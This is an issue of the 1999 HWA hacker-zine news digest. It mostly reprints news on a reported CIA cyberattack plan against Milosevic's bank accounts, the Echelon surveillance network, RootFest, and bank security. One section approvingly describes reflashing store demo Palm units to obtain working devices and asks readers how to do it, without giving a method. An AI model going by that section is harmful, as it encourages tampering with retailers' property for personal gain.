   Synopsis 
   ---------
   
   The purpose of this newsletter is to 'digest' current events of interest
   that affect the online underground and netizens in general. This includes
   coverage of general security issues, hacks, exploits, underground news
   and anything else I think is worthy of a look see. (remember i'm doing
   this for me, not you, the fact some people happen to get a kick/use
   out of it is of secondary importance).

    This list is NOT meant as a replacement for, nor to compete with, the
   likes of publications such as CuD or PHRACK or with news sites such as
   AntiOnline, the Hacker News Network (HNN) or mailing lists such as
   BUGTRAQ or ISN nor could any other 'digest' of this type do so.

    It *is* intended  however, to  compliment such material and provide a
   reference to those who follow the culture by keeping tabs on as many
   sources as possible and providing links to further info, its a labour
   of love and will be continued for as long as I feel like it, i'm not
   motivated by dollars or the illusion of fame, did you ever notice how
   the most famous/infamous hackers are the ones that get caught? there's
   a lot to be said for remaining just outside the circle... &lt;g>

 00.1 CONTACT INFORMATION AND MAIL DROP
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


     Wahoo, we now have a mail-drop, if you are outside of the U.S.A or
    Canada / North America (hell even if you are inside ..) and wish to
    send printed matter like newspaper clippings a subscription to your
    cool foreign hacking zine or photos, small non-explosive packages
    or sensitive information etc etc well, now you can. (w00t) please
    no more inflatable sheep or plastic dog droppings, or fake vomit
    thanks.

    Send all goodies to:

	    HWA NEWS
	    P.O BOX 44118
	    370 MAIN ST. NORTH
	    BRAMPTON, ONTARIO
	    CANADA
	    L6V 4H5

    WANTED!: POSTCARDS! YESH! POSTCARDS, I COLLECT EM so I know a lot of you are
    ~~~~~~~  reading this from some interesting places, make my day and get a
             mention in the zine, send in a postcard, I realize that some places
             it is cost prohibitive but if you have the time and money be a cool
             dude / gal and send a poor guy a postcard preferably one that has some
             scenery from your place of residence for my collection, I collect stamps
             too so you kill two birds with one stone by being cool and mailing in a
             postcard, return address not necessary, just a  "hey guys being cool in
             Bahrain, take it easy" will do ... ;-) thanx.



    Ideas for interesting 'stuff' to send in apart from news:

    - Photo copies of old system manual front pages (optionally signed by you) ;-)
    - Photos of yourself, your mom, sister, dog and or cat in a NON
      compromising position plz I don't want pr0n. &lt;g>
    - Picture postcards
    - CD's 3.5" disks, Zip disks, 5.25" or 8" floppies, Qic40/80/100-250
      tapes with hack/security related archives, logs, irc logs etc on em.
    - audio or video cassettes of yourself/others etc of interesting phone
      fun or social engineering examples or transcripts thereof.

    If you still can't think of anything you're probably not that interesting
    a person after all so don't worry about it &lt;BeG>

    About the Bugtraq mailing list
    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    The following comes from Bugtraq's info file:

    This list is for *detailed* discussion of UNIX security holes: what they are,
    how to exploit, and what to do to fix them.

    This list is not intended to be about cracking systems or exploiting their
    vulnerabilities. It is about defining, recognizing, and preventing use of
    security holes and risks.

    Please refrain from posting one-line messages or messages that do not contain
    any substance that can relate to this list`s charter.

    I will allow certain informational posts regarding updates to security tools,
    documents, etc. But I will not tolerate any unnecessary or nonessential "noise"
    on this list.

    Please follow the below guidelines on what kind of information should be posted
    to the Bugtraq list:

    + Information on Unix related security holes/backdoors (past and present)
    + Exploit programs, scripts or detailed processes about the above
    + Patches, workarounds, fixes
    + Announcements, advisories or warnings
    + Ideas, future plans or current works dealing with Unix security
    + Information material regarding vendor contacts and procedures
    + Individual experiences in dealing with above vendors or security organizations
    + Incident advisories or informational reporting

    Any non-essential replies should not be directed to the list but to the originator of the message. Please do not "CC" the bugtraq
    reflector address if the response does not meet the above criteria.

      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                             
      
      Well what does HWA stand for? never mind if you ever find out I may
     have to get those hax0rs from 'Hackers' or the Pretorians after you.

     In case you couldn't figure it out hax0r is "new skewl" and although
     it is laughed at, shunned, or even pidgeon holed with those 'dumb
     leet (l33t?) dewds' &lt;see article in issue #4> this is the state
     of affairs. It ain't Stephen Levy's HACKERS anymore. BTW to all you
     up  and comers, i'd highly recommend you get that book. Its almost
     like  buying a clue. Anyway..on with the show .. - Editorial staff

00.5  HWA FAQ v1.0 Feb 13th 1999 (Abridged & slightly updated again)
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    Also released in issue #3. (revised) check that issue for the faq
    it won't be reprinted unless changed in a big way with the exception
    of the following excerpt from the FAQ, included to assist first time
    readers:

    Some of the stuff related to personal useage and use in this zine are
    listed below: Some are very useful, others attempt to deny the any possible
    attempts at eschewing obfuscation by obsucuring their actual definitions.

    @HWA   - see EoA  ;-)

    !=     - Mathematical notation "is not equal to" or "does not equal"
             ASC(247)  "wavey equals" sign means "almost equal" to. If written
             an =/= (equals sign with a slash thru it) also means !=, =< is Equal
             to or less than and =>  is equal to or greater than (etc, this aint
             fucking grade school, cripes, don't believe I just typed all that..)

    AAM    - Ask a minor (someone under age of adulthood, usually <16, <18 or <21)

    AOL    - A great deal of people that got ripped off for net access by a huge
             clueless isp with sekurity that you can drive buses through, we're
             not talking Kung-Fu being none too good here, Buy-A-Kloo maybe at the
             least they could try leasing one??

   *CC     - 1 - Credit Card (as in phraud)
             2 - .cc is COCOS (Keeling) ISLANDS butthey probably accept cc's

    CCC    - Chaos Computer Club (Germany)

   *CON    - Conference, a place hackers crackers and hax0rs among others go to swap
             ideas, get drunk, swap new mad inphoz, get drunk, swap gear, get drunk
             watch videos and seminars, get drunk, listen to speakers, and last but
             not least, get drunk.
   *CRACKER - 1 . Someone who cracks games, encryption or codes, in popular hacker
                 speak he's the guy that breaks into systems and is often (but by no
                 means always) a "script kiddie" see pheer
              2 . An edible biscuit usually crappy tasting without a nice dip, I like
                  jalapeno pepper dip or chives sour cream and onion, yum - Ed

    Ebonics - speaking like a rastafarian or hip dude of colour &lt;sic> also wigger
              Vanilla Ice is a wigger, The Beastie Boys and rappers speak using
              ebonics, speaking in a dark tongue ... being ereet, see pheer

    EoC    - End of Commentary

    EoA    - End of Article or more commonly @HWA

    EoF    - End of file

    EoD    - End of diatribe (AOL'ers: look it up)

    FUD    - Coined by Unknown and made famous by HNN &lt;g> - "Fear uncertainty and doubt",
            usually in general media articles not high brow articles such as ours or other
            HNN affiliates ;)

    du0d   - a small furry animal that scurries over keyboards causing people to type
             weird crap on irc, hence when someone says something stupid or off topic
             'du0d wtf are you talkin about' may be used.

   *HACKER - Read Stephen Levy's HACKERS for the true definition, then see HAX0R

   *HAX0R - 1 - Cracker, hacker wannabe, in some cases a true hacker, this is difficult to
            define, I think it is best defined as pop culture's view on The Hacker ala
            movies such as well erhm "Hackers" and The Net etc... usually used by "real"
            hackers or crackers in a derogatory or slang humorous way, like 'hax0r me
            some coffee?' or can you hax0r some bread on the way to the table please?'

            2 - A tool for cutting sheet metal.

    HHN    - Maybe a bit confusing with HNN but we did spring to life around the same
             time too, HWA Hax0r News.... HHN is a part of HNN .. and HNN as a proper
             noun means the hackernews site proper. k? k. ;&

      Hacking the Palm Pilot demos...

      As we all know 3Com has recently released the Palm IIIx and V.
      
      
      The Palm V demo in store displays is a dummy unit with a hunk of lead
      inside.
      
      
      On the other hand the Palm IIIx is a fully working unit. There is a
      trick to make it work 100%. Like it's predecesor the Palm III the demo,
      if you could get your hands on one was not hard to reflash the OS rom
      and presto you had a Palm III worth $500.00 and there was little effort
      involved. 
      
      
      The IIIx poses a little more difficulty. They have employed a new
      strategy. 1st 3Com went with the new Ezball Motorola Dragon processor,
      and put the Os in static non volitile memory. While it's not hard to
      download a fresh copy of the OS from a real store bought IIIx, the trick
      is in flashing the demo unit. The programs used to flash the III does
      not work on the IIIx, all you will get is a 'wrong header card version'
      message, which basiclly seals your fate. I have been working on trying
      to flash the proper OS replacing the demo OS (which won't allow you to
      input anything) to no avail. I put it out to the people who do these
      things best. I know not what to do from here. I have a few insiders
      helping but it is a much kept secret.

 03.0 Clinton Authorizes Cyber Attack??? 
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      
      From HNN http://www.hackernews.com/     

      contributed by Sangfroid 
      Reuters and Wired Online articles are referencing a print
      story in Newsweek that claims that President Clinton
      has authorized a "top-secret" plan against Slobodan
      Milosevic. One part of this plan would use "computer
      hackers" to attack his foreign bank accounts. Reuters
      also claimed that Newsweek said that the report
      instructed the CIA to wage "cyberwar" against Milosevic. 

      Now there are still a few questions that are not
      answered in this news article. If the report was so
      top-secret how did NewsWeek learn of it? Won't other
      countries be rather upset when we "hack" into their
      banks? And aren't his bank accounts frozen anyway, so
      what is the point of breaking in? News week even
      admits that it does not have access to the original
      report. Once again until we see confirmation HNN will
      treat this story as extremely suspect.

      Cyberwar and Sabotage
 
      President Clinton has OK'd a top-secret plan to destabilize
      Milosevicùand go after his money 
 
      By Gregory L. Vistica 
 
      Covert action is seductive to policymakers in a bind. When diplomacy fails
      and force falls short, presidents often turn to the CIA for secret solutions
      to vexing problems. Unable to make the air war against Serbian leader
      Slobodan Milosevic effective, and unwilling to invade with ground troops,
      President Clinton has decided to try a clandestine third way. Earlier this
      month national-security adviser Sandy Berger presented Clinton with a
      covert plan to squeeze Milosevic. 
 
      The president liked the idea. Senior intelligence officials tell NEWSWEEK
      that last week Clinton issued a "finding," a highly classified document
      authorizing the spy agency to begin secret efforts "to find other ways to get
      at Milosevic," in the words of one official. Two weeks ago Berger secretly
      briefed members of the House and Senate Intelligence committees about
      the details of the two-part plan. According to sources who have read the
      finding, the CIA will train Kosovar rebels in sabotageùage-old tricks like
      cutting telephone lines, blowing up buildings, fouling gasoline reserves and
      pilfering food suppliesùin an effort to undermine public support for the
      Serbian leader and damage Yugoslav targets that can't be reached from
      the air. That much is unsurprising. But the CIA has also been instructed to
      conduct a cyberwar against Milosevic, using government hackers to tap
      into foreign banks and, in the words of one U.S. official, "diddle with
      Milosevic's bank accounts." 
 
      The finding was immediately criticized by some lawmakers who
      questioned the wisdomùand legalityùof launching a risky covert action
      that, if discovered, could prolong the war, alienate other NATO
      countriesùand possibly blow back on the United States. Under the
      finding, the allies were to be kept in the dark about the plan. Other
      members of Congress privy to the finding wondered about its timing. Why
      did Clinton authorize the operation just as diplomats had begun making
      progress on a peace agreement? The White House declined to comment
      on the finding, and NEWSWEEK does not have access to the entire
      document. But some intelligence officials with knowledge of its contents
      worry that the finding was put together too hastily, and that the potential
      consequences haven't been fully thought out. "If they pull it off, it will be
      great," says one government cyberwar expert. "If they screw it up, they
      are going to be in a world of trouble." 
      
      By far the most controversialùand probably most difficultùpart of the
      operation would be the effort to hack into Milosevic's foreign bank
      accounts. Intelligence sources believe they have identified banks in several
      countries, including Russia, Greece and Cyprus, where the Serb leader has
      hidden millions of dollars. But the Hollywood vision of a brainy nerd
      draining bank accounts from his computer at CIA headquarters is a
      fantasy. According to government intelligence experts, agents would have
      to visit each of the banks, set up new accounts, then carefully watch how
      the institution operates and look for weak links in its security. The National
      Security Agency's hackers would use that information to try to overcome
      today's sophisticated encryption software and fire walls. If they gained
      access, the hackers could do almost anything they liked with Milosevic's
      cashùsteal it, move it to a dummy account or slowly drain it away a few
      thousand dollars at a time. 
 
      But should they? The idea of a U.S.-sponsored plan to break into foreign
      banks unnerves some intelligence officials, who point out that the operation
      would be a breach of national sovereignty in friendly countries and open
      the door to computer attacks on U.S. banks. What's more, the United
      States would be the main loser if confidence in the world banking system
      were undermined. 
 
      The sabotage plan also entails some serious problems. The CIA would
      somehow have to find and train guerrillas without helping the Kosovo
      Liberation Army, which the administration itself labeled a terrorist
      organization just a year ago and which is believed to fund its operations
      with profits from international drug smuggling. In the chaos now prevailing
      in Kosovar refugee camps it will not be easy for the CIA to make sure the
      anti-Milosevic rebels it signs up have no KLA ties. Intelligence officials
      also worry it would be difficult to control the U.S.-trained rebels once
      boot camp is over and they are set loose on Milosevic. "I'm afraid they
      could use their training to carry out atrocities," says John Rothrock, the Air
      Force's former chief of intelligence planning. "If they think they can rein
      them in, it's tremendous naivetΘ." 
 
      Congress can complain all it likes, but it has no legal authority to stop the
      finding. Lawmakers can try to block the plan by refusing to provide money
      for the covert action, but the president can tap into his emergency funds to
      finance it. At this point, it is not at all certain that the finding will ultimately
      be carried out. If the grumblings from the Hill and the intelligence
      community grow too loud, or if the risk-averse CIA chooses to drag its
      feet, the president may opt to quietly kill the findingùand pretend it never
      existed.

 03.1 More on the Cyberwar
      ~~~~~~~~~~~~~~~~~~~~
      
      Contributed by Twstdpair (Source: MSNBC)
      
      Cyberwar? The U.S. stands to lose
      Experts argue plan to raid Milosevic's bank accounts would do more harm
      than good 
      
      May 28 - It sounded like a TomClancy spy novel.Newsweekreported last week
      that the CIAwas planning to tinker withinternational bank accounts fullof Slobodan
      Milosevic's money -just another way of getting under the Yugoslav president's skin.
      Information warfare experts disagree about the feasibility of such a cyberattack. But
      there's little disagreement the U.S. stands to lose much more than itmight gain from 
      firing the firstvolley in such an infomation war.In fact, some believe damage has 
      already been done. 
      
      THE NEWSWEEK STORY RAISED several issues: What international lawswould govern a 
      U.S.-backed attack ona bank in a third-party nation? Is suchan attack feasible in the 
      first place? What kind of retaliation might U.S.citizens, and their bank accounts, 
      face? But most important, what does even the possibility of such an attack do to the
      integrity of international banking systems? The story on the cyberattack - fact, fiction 
      or somewhere in between - could already have put the U.S. at risk,said Kawika M. Dajuio,
      executive vice president of the Financial Information Protection Association.
      
      Banking systems hinge on public confidence. You put the money in; you're confident you'll
      be able to take the money out. If there's any hint you might not be able to get at your 
      money, you'd withdraw it. Any attack on the integrity of a banking system anywhere - 
      particularly when retaliation seems like such an obvious possibility - chips away at 
      public confidence. "It bothers me because we have had conversations with the defense and 
      intelligence community. We thought this was off the table," Dajuio said.  "We've had 
      discussions with rather senior policy-makers. We thought they understood the importance 
      of protecting public confidence in the payment system." But retaliation by foreign agents
      might be just one source of insecurity for U.S. account holders. There's another: If the 
      government can and is willing to tinker with foreign accounts, what will stop it from 
      tinkering with mine? 
      
      COULD IT BE DONE? Could U.S. agents hijack Milosevic's money, allegedly stashed away in
      foreign banks? Yes and no. Experts agree that the CIA has had the know-how to control 
      bank accounts for years, through old- fashioned non-cyber methods, such as coercing bank
      authorities, or even through legal methods such as freezing accounts. On the other hand,
      it's not easy when the target knowns what's coming. According to MSNBC analyst Bill Arkin,
      the international community, including UNSCOM, is still trying to get its hands on Saddam 
      Hussein's assets. And such real-world tactics are a far cry from the cyberwar image of a 
      few CIA hackers sitting at a keyboard moving around money thanks to an Internet connection
      and some wits. There's disagreement about how possible that might be. "The audits we have 
      performed tell us [banks] are not invulnerable," says a security expert identifying himself
      as Space Rogue. Rogue works at L0pht Heavy Industries, which hires out to hack corporate 
      computer systems to test their vulnerability. "Banks have a little more security in place,
      but that security is still not at a level where it's unbreakable." While money systems aren't
      connected to the public Internet, "sometimes they have a modem dangling off for remote access,
      or they use cryptography, but not correctly," he said. Others suggest cracking a bank that 
      holds Milosevic money - outside the more traditional methods - is nearly impossible.  "I deal
      in probabilities, and I've never seen it," said a man identifying himself as Louis Cipher, a
      principal investor in Infowar.com. Cipher is also in charge of security at what he says is the
      "sixth-largest brokerage in America." He suggested very few individuals have the skills 
      necessary to "tunnel" from an Internet connection through mainframe systems in banks - in 
      fact, a team of specialists and inside information would be required."You'd have to be an 
      applications specialist to even navigate to a screen," he said. "You're talking well beyond
      the skills of hackers. It would have to be an insider working with Job Control Language 
      sitting on the mainframe. The only one who would have that ability other than the U.S. 
      government would be organized crime." And Cipher is skeptical about the U.S. government's 
      ability to hire and hold the brightest minds in the security industry - since no government
      agency can match the lure of stock options offered by a high-tech firm. Still, even the 
      possibility of the U.S. using a wired computer to move Milosevic's money drew swift reaction
      from information warfare observers. Even hacker groups protested the notion, with a hacker 
      calling himself "sixtoed" setting up a Web page in protest. The reason: Since the U.S. relies
      more on technology and information than any other nation, it stands to lose the most from such
      a cyberwar. "I am not one for an information arms race," said Frank Cilluffo, senior analyst at
      the Center for Strategic and International Studies in Washington. "We will lose that race.... 
      We're a hell of a lot more susceptible to retaliation. The defensive implications outweigh the
      offensive implications." Anyone can build up an information
      warfare capability, Cilluffo said. And it's much more like guerrilla war than nuclear war - it's
      easy for the enemy to hide, and there's no real deterrent. Therefore, retaliation could be swift
      and indiscriminate. In addition, there is a general principle among security experts suggesting
      once a system's security is compromised, it's much easier to compromise a second time. So the U.S.
      could very well be paving the way for retribution. 
      
      WHY NO DENIALS?  Fear of such retaliation attempts, or even the perception of such retaliation 
      attempts, drove Dajuio to start calling his friends on the intelligence community to complain
      as soon as the Newsweek story hit. He has yet to receive the reassurance he was hoping for.
      "If it's true or it's just leaks, it's bad to have the story out there," Dajuio said. "I have yet
      to have anyone tell me 'Don't worry, everything's OK.' ... If they haven't done anything, the
      most appropriate thing to do is to come out and say they're not doing it."
      The CIA isn't doing that; a spokesperson told MSNBC the agency couldn't comment on its activities,
      but one source familiar with U.S. intelligence capabilities tells MSNBC to be "very skeptical" of the
      Newsweek story. Meanwhile, opening the Pandora's box of cyberwar would lead to a
      series of yet-to-be answered questions. International law isn't ready to handle such conflicts, says
      Cilluffo - so if the U.S. broke into a bank in Cyprus, what laws would govern that act? And could the
      compromised bank sue the U.S. government? "What are the rules of engagement
      here?" Cilluffo asked. "What is game, what is not game? This may be a harbinger of how we prosecute and
      wage war in the future."

      The hacker convention RootFest was held in Minneapolis
      over the weekend. Evidently this scared the local
      authorities enough to shut down several vulnerable
      points in its computer network. The city respond to the
      three day hacker convention by shutting down some
      older dial-up modem lines. (Wonder if they will come
      back online afterwards?) Other reports also indicate
      that the Minneapolis City Police also shut down its
      computer network over the weekend.

      HACKERS WORRY MINNEAPOLIS OFFICIALS
      City Secures Its Computers as Conference Comes to Town 

      May 21, 1999 

      By Hans H. Chen 

      MINNEAPOLIS (APBNews.com) -- The arrival of several hundred
      computer hackers this weekend has prompted the city to shut down
      several vulnerable points in its computer network. 

      While the city's computer guru called the weekend shutdown "an
      opportunity to remind ourselves of network-based security," the
      conference organizer called the measures "an overly paranoid
      precaution." 

      The hackers descended today on the Minneapolis Convention Center for
      RootFest 99, a three-day discussion of computer security open to "the
      computer underground, hackers, IT professionals, government agents,
      feds," according to the conference's Web site. 

      The conference features sessions entitled "Circumventing Internet
      Censorship," and "Internet Security in Europe: State of Affairs."
      Speakers include both hackers and computer security consultants 

      City downplays concerns 

      But the city responded to the event by closing off some older dial-up
      modem lines that a few telecommuting employees and remote city
      agencies still use to connect into the city's network. 

      Don Saelens, the city's information technology manager, downplayed
      concerns about possible hacking attempts. 

      The conference, Saelens said, presented "an opportunity to remind
      ourselves of network-based security." 

      But Saelens did admit that the timing of the system shutdown was not
      wholly coincidental. 

      "We've been doing a number of upgrades on our own networks, and
      these were all slated to go out anyway this year," Saelens said. "I have
      to admit, [this conference] was a reminder of network security that
      heightened the awareness." 

      Police reportedly shut down 

      In addition, the Minneapolis Star Tribune reported that the city Police
      Department shut down its computer network over the weekend. Saelens
      and a police official refused to confirm the report, citing safety
      concerns. 

      "The only thing the police is saying is we are not releasing anything we
      are doing for security reasons," said Penny Parrish, a police
      department spokeswoman. 

      'Hacker threat'? 

      Chris Lothos, an organizer of RootFest, attacked the city's measures in
      a dispatch on the RootFest Web site. 

      "It's an overly paranoid precaution taken for the 'hacker threat' that
      RootFest supposedly poses to the world at large," Lothos wrote. 

      The conference also printed on its Web site a copy of the e-mail memo
      Saelens sent to city employees alerting them to the security measures.
      Saelens said he's not sure how the group got a copy of his e-mail.

 05.0 Australia Admits to Echelon 
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~
      
      from HNN http://www.hackernews.com/   

      contributed by erewhon 
      Martin Brady, director of the Defense Signals Directorate
      in Canberra Austrailia has admitted that his country
      does participate in a secret spy organization known as
      UKUSA. This organization works with the intelligence
      agencies of Australia, Canada, New Zealand, the UK and
      the USA to intercept every fax, telex, e-mail, phone
      call, or computer data that is carried via commercial
      satellite communications. This global eavesdropping is
      known as Echelon

      The Age;
      
      Careful, they might hear you 
 
      By DUNCAN CAMPBELL 
 
      Australia has become the first country openly to admit that it
      takes part in a global electronic surveillance system that
      intercepts the private and commercial international
      communications of citizens and companies from its own and
      other countries. The disclosure is made today in Channel 9's
      Sunday program by Martin Brady, director of the Defence
      Signals Directorate in Canberra.
 
      Mr Brady's decision to break ranks and officially admit the
      existence of a hitherto unacknowledged spying organisation
      called UKUSA is likely to irritate his British and American
      counterparts, who have spent the past 50 years trying to prevent
      their own citizens from learning anything about them or their
      business of ``signals intelligence'' - ``sigint'' for short.
 
      In his letter to Channel 9 published today, Mr Brady states that
      the Defence Signals Directorate (DSD) ``does cooperate with
      counterpart signals intelligence organisations overseas under the
      UKUSA relationship".
 
      In other statements which have now been made publicly
      available on the Internet (www.dsd.gov.au), he also says that
      DSD's purpose ``is to support Australian Government
      decision-makers and the Australian Defence Force with
      high-quality foreign signals intelligence products and services.
      DSD (provides) important information that is not available from
      open sources".
 
      Together with the giant American National Security Agency
      (NSA) and its Canadian, British, and New Zealand
      counterparts, DSD operates a network of giant, highly
      automated tracking stations that illicitly pick up commercial
      satellite communications and examine every fax, telex, e-mail,
      phone call, or computer data message that the satellites carry.
 
      The five signals intelligence agencies form the UKUSA pact.
      They are bound together by a secret agreement signed in 1947
      or 1948. Although its precise terms have never been revealed,
      the UKUSA agreement provides for sharing facilities, staff,
      methods, tasks and product between the participating
      governments. 
 
      Now, due to a fast-growing UKUSA system called Echelon,
      millions of messages are automatically intercepted every hour,
      and checked according to criteria supplied by intelligence
      agencies and governments in all five UKUSA countries. The
      intercepted signals are passed through a computer system called
      the Dictionary, which checks each new message or call against
      thousands of ``collection'' requirements. The Dictionaries then
      send the messages into the spy agencies' equivalent of the
      Internet, making them accessible all over the world. 
 
      Australia's main contribution to this system is an ultra-modern
      intelligence base at Kojarena, near Geraldton in Western
      Australia. The station was built in the early 1990s. At Kojarena,
      four satellite tracking dishes intercept Indian and Pacific Ocean
      communications satellites. The exact target of each dish is
      concealed by placing them inside golfball like ``radomes''. 
 
      About 80 per cent of the messages intercepted at Kojarena are
      sent automatically from its Dictionary computer to the CIA or
      the NSA, without ever being seen or read in Australia. Although
      it is under Australian command, the station - like its controversial
      counterpart at Pine Gap - employs American and British staff in
      key posts. 
 
      Among the ``collection requirements" that the Kojarena
      Dictionary is told to look for are North Korean economic,
      diplomatic and military messages and data, Japanese trade
      ministry plans, and Pakistani developments in nuclear weapons
      technology and testing. In return, Australia can ask for
      information collected at other Echelon stations to be sent to
      Canberra. 
 
      A second and larger, although not so technologically
      sophisticated DSD satellite station, has been built at Shoal Bay,
      Northern Territory. At Shoal Bay, nine satellite tracking dishes
      are locked into regional communications satellites, including
      systems covering Indonesia and south-west Asia. 
 
      International and governmental concern about the UKUSA
      Echelon system has grown dramatically since 1996, when New
      Zealand writer Nicky Hager revealed intimate details of how it
      operated. New Zealand runs an Echelon satellite interception
      site at Waihopai, near Blenheim, South Island. Codenamed
      ``Flintlock", the Waihopai station is half the size of Kojarena and
      its sister NSA base at Yakima, Washington, which also covers
      Pacific rim states. Waihopai's task is to monitor two Pacific
      communications satellites, and intercept all communications from
      and between the South Pacific islands. 
 
      Like other Echelon stations, the Waihopai installation is
      protected by electrified fences, intruder detectors and infra-red
      cameras. A year after publishing his book, Hager and New
      Zealand TV reporter John Campbell mounted a daring raid on
      Waihopai, carrying a TV camera and a stepladder. From open,
      high windows, they then filmed into and inside its operations
      centre. 
 
      They were astonished to see that it operated completely
      automatically. 
 
      Although Australia's DSD does not use the term ``Echelon'',
      Government sources have confirmed to Channel 9 that Hager's
      description of the system is correct, and that the Australia's
      Dictionary computer at Kojarena works in the same way as the
      one in New Zealand. 
 
      Until this year, the US Government has tried to ignore the row
      over Echelon by refusing to admit its existence. The Australian
      disclosures today make this position untenable. US intelligence
      writer Dr Jeff Richelson has also obtained documents under the
      US Freedom of Information Act, showing that a US Navy-run
      satellite receiving station at Sugar Grove, West Virginia, is an
      Echelon site, and that it collects intelligence from civilian
      satellites. 
 
      The station, south-west of Washington, lies in a remote area of
      the Shenandoah Mountains. According to the released US
      documents, the station's job is ``to maintain and operate an
      Echelon site''. Other Echelon stations are at Sabana Seca,
      Puerto Rico, Leitrim, Canada and at Morwenstow and London
      in Britain. 
 
      Information is also fed into the Echelon system from taps on the
      Internet, and by means of monitoring pods which are placed on
      undersea cables. Since 1971, the US has used specially
      converted nuclear submarines to attach tapping pods to deep
      underwater cables around the world. 
 
      The Australian Government's decision to be open about the
      UKUSA pact and the Echelon spy system has been motivated
      partly by the need to respond to the growing international
      concern about economic intelligence gathering, and partly by
      DSD's desire to reassure Australians that its domestic spying
      activity is strictly limited and tightly supervised. 
 
      According to DSD director Martin Brady, ``to ensure that (our)
      activities do not impinge on the privacy of Australians, DSD
      operates under a detailed classified directive approved by
      Cabinet and known as the Rules on Sigint and Australian
      Persons". 
 
      Compliance with this Cabinet directive is monitored by the
      inspector-general of security and intelligence, Mr Bill Blick. He
      says that ``Australian citizens can complain to my office about
      the actions of DSD. And if they do so then I have the right to
      conduct an inquiry." 
 
      But the Cabinet has ruled that Australians' international calls,
      faxes or e-mails can be monitored by NSA or DSD in specified
      circumstances. These include ``the commission of a serious
      criminal offence; a threat to the life or safety of an Australian; or
      where an Australian is acting as the agent of a foreign power".
      Mr Brady says that he must be given specific approval in every
      case. But deliberate interception of domestic calls in Australia
      should be left to the police or ASIO. 
 
      Mr Brady claims that other UKUSA nations have to follow
      Australia's lead, and not record their communications unless
      Australia has decided that this is required. ``Both DSD and its
      counterparts operate internal procedures to satisfy themselves
      that their national interests and policies are respected by the
      others," he says. 
 
      So if NSA happens to intercept a message from an Australian
      citizen or company whom DSD has decided to leave alone, they
      are supposed to strike out the name and insert ``Australian
      national'' or ``Australian corporation'' instead. Or they must
      destroy the intercept. 
 
      That's the theory, but specialists differ. According to Mr Hager,
      junior members of UKUSA just can't say ``no''. ``... When
      you're a junior ally like Australia or New Zealand, you never
      refuse what they ask for.'' 
 
      There are also worries about what allies might get up to with
      information that Australia gives them. When Britain was trying to
      see through its highly controversial deal to sell Hawk fighters and
      other arms to Indonesia, staff at the Office of National
      Assessments feared that the British would pass DSD intelligence
      on East Timor to President Soeharto in order to win the lucrative
      contract. 
 
      The Australian Government does not deny that DSD and its
      UKUSA partners are told to collect economic and commercial
      intelligence. Australia, like the US, thinks this is especially
      justified if other countries or their exporters are perceived to be
      behaving unfairly. Britain recognises no restraint on economic
      intelligence gathering. Neither does France. 
 
      According to the former Canadian agent Mike Frost, it would
      be ``nave" for Australians to think that the Americans were not
      exploiting stations like Kojarena for economic intelligence
      purposes. ``They have been doing it for years," he says. ``Now
      that the Cold War is over, the focus is towards economic
      intelligence. Never ever over-exaggerate the power that these
      organisations have to abuse a system such as Echelon. Don't
      think it can't happen in Australia. It does.''

 06.0 Banks to Test Home User PC Security

      Big banks move on Net security 
      By Tim Clark
      Staff Writer, CNET News.com
      May 21, 1999, 1:00 p.m. PT 
 
      Worried that problems on home computers may make Internet banking insecure, a
      group of major U.S. banks is expected to unveil a plan this summer to open a lab
      to test the security of Web browsers and PC hardware and software. 
 
      "The banks feel that firewalls and what they have internally is in great shape, but the link is
      to the consumer and PC environments [where they find security more suspect]," said
      Catherine Allen, chief executive of the Banking Industry Technology Secretariat, a division
      of Bankers Roundtable. 
 
      BITS is governed by a board of CEOs of the 15 largest U.S. banks, including familiar
      names like Citibank, Chase Manhattan, Mellon Bank, Wells Fargo, and Bank of America.
      Edward Crutchfield, First Union chief executive, chairs BITS, a two-year-old group that
      focuses on technology issues affecting the U.S. banking system. 
 
      The BITS Security/Technology Lab, to be run by a new banking-oriented division of
      government contractor SAIC, is due to be announced in late June or early July, with vice
      president Al Gore and former U.S. Sen. Sam Nunn invited to speak. A July meeting is
      planned in the San Francisco area to explain the program to hardware and software
      vendors. 
 
      Security experts from major banks are currently drafting the testing criteria. In addition, the
      lab oversight group is working with the President's Commission on Critical Infrastructure
      Protection on ways to protect the nation's financial infrastructure from attacks by terrorist
      or organized criminal groups. President Clinton formed that group a year ago after a report
      on threats from cyber-terrorists. 
 
      The effort also will involve information sharing among banks to ward off organized attacks,
      including use of neural networking and other technologies to detect and predict patterns of
      attacks. 
 
      "If it's a terrorist or major criminal activity, we think it will happen in multiple places," Allen
      said. "They won't hit just one bank but many." Security planners worry that assaults could
      be mounted near the end of this year, when attackers hope banks might be distracted by
      the Y2K turnover. 
 
      The testing of consumer devices and software will be coupled with educational campaigns
      urging users to utilize antivirus software and take other precautions to avoid security
      problems. 
 
      Systems that pass the tests can use a special logo in their marketing to signify the
      products have been deemed safe by BITS. Also to be tested are systems to conduct
      financial transactions, including personal financial software, online billing and bill-paying
      packages, and smart cards. 
 
      "Vendors want this as much as we do," Allen contended, saying that today vendors may
      get multiple requests from different banks to make specific changes for that bank's use.
      Funneling through the BITS lab would simplify that process. 
 
      The effort comes as financial institutions are beginning to use the Internet for online
      banking, stock trading, and other transactions. In the past, online consumer transactions
      have been routed over private networks that banks regard as more secure. But the
      explosion of the Internet, which is not such a controlled or secure environment, has
      bankers looking for safety. 
 
      Another reflection of that concern has been the efforts by Visa and MasterCard, on the
      behalf of their bank-owners, to push the Secure Electronic Transactions (SET) protocol for
      Internet credit card purchases. Although SET has not been widely adopted in the U.S., the
      prolonged push to implement it mirrors bankers' worries about their reputation as trusted
      institutions. 
 
      But there's a financial implication too. Banks are heavily regulated, and they are required to
      reimburse their customers for any losses suffered because of security breaches in online
      financial transactions. As online banking grows, that could become a big liability.

 07.0 EMPEROR VIRUS
      ~~~~~~~~~~~~~
      
      From http://www.net-security.org/
      
      by BHZ, Tuesday 25th May 1999 on 4.46 pm CET
      AVP announced new clone of the Cheronobyl virus named Emperor. The Emperor
      virus has additional technology to infect more systems by copying itself to more
      areas of the computer and has the possibility to travel further. It infects DOS (16-bit)
      COM and EXE programs and overwrites the Master Boot Record of the hard drive and
